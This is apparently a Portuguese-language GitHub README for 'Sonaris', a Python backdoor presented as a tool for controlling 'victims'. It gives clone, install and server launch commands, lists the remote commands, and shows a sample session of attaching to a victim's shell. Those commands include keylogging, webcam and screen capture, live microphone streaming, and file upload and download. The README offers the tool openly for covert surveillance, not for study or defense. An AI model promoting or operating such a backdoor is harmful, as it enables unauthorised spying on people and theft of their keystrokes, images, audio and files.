![badges](https://img.shields.io/badge/Python-v3.8-red)
<h1 align='center'><i>"Get ready to hack the planet!"</i></h1>

## Instalação
Baixe ou clone o repositório usando:
```bash
git clone https://github.com/zNairy/Sonaris
```
Em seguida instale os recursos necessários descritos em <b>requirements</b>, utilizando o pip de acordo com sua versão do Python.
```bash
python -m pip install -r requirements.txt
```
## Como usar
Inicie o lado servidor com <tt>python main.py</tt> para suportar cada vítima que se conectar à ele. Por padrão, tanto o servidor quanto cada cliente é conectado no endereço <tt>0.0.0.0:5000</tt> se nenhum argumento for passado em sua instância.
```python
class Server(object):
    """ server side backdoor """
    def __init__(self, host='0.0.0.0', port=5000):
```
Uma porta ou endereço diferente também podem ser passados por meio de argumentos, somente no lado servidor
```bash
python main.py -a 127.0.0.1 -p 1234
```
O lado cliente deve ser iniciado formalmente e seu endereço e porta são passados diretamente na instância do objeto.
## Funcionalidades
Assim como qualquer outro backdoor, o <i>Sonaris</i> conta com funcionalidades básicas de navegação, gerência das sessões e funcionamento interno do programa. Ao rodar o comando principal <tt>/commands</tt> lhe será mostrado a lista de todos os comandos possíveis.
```txt
  /attach
  /detach
  /sessions
  /sessioninfo
  /userinfo
  /rmsession
  /screenshot
  /webcamshot
  /download
  /upload
  /processlist
  /processinfo
  /terminateprocess
  /micrecord
  /micstream
  /kloggerstart
  /kloggerdump
  /kloggerstop
  /author
  /contact
  /version
  /internalcommands
  /commands
  ```
  Os comandos de gerência interna podem ser visualizados rodando o comando <tt>/internalcommands</tt>.
  ```
  /attach
  /detach
  /sessions
  /sessioninfo
  /userinfo
  /rmsession
  /author
  /contact
  /version
  /internalcommands
  /commands
  ```
  Alguns comandos são executados somente quando há alguma sessão anexada, caso contrário lhe será exibido algum descritivo do comando.
  ```bash
  znairy@sonaris:# /contact
Discord: zNairy#7181 | Github: https://github.com/zNairy/
  znairy@sonaris:# /micstream
Info: Starts a microphone streaming.
```
O backdoor é multi-client, o que significa que você pode ter mais de uma conexão simultânea.
Após receber alguma conexão, verifique se está ativa com o comando <tt>/sessions</tt>.
```bash
[*] Incoming connection from znairy:Linux
znairy@sonaris#:# /sessions
  -znairy
```
Se anexe à sessão da vítima desejada e seja feliz _;)_
```bash
znairy@sonaris:# /attach znairy
 You are attached to a section with znairy now!
znairy@sonaris:/home/znairy/Documents/Github/Sonaris# 
```
## Observações
O projeto ainda não está totalmente concluído, por isso se deseja fazer alguma contribuição ou crítica construtiva, faça um pull request ou entre em contato comigo pelo <a href="https://discord.com/" target="_blank">Discord</a>.
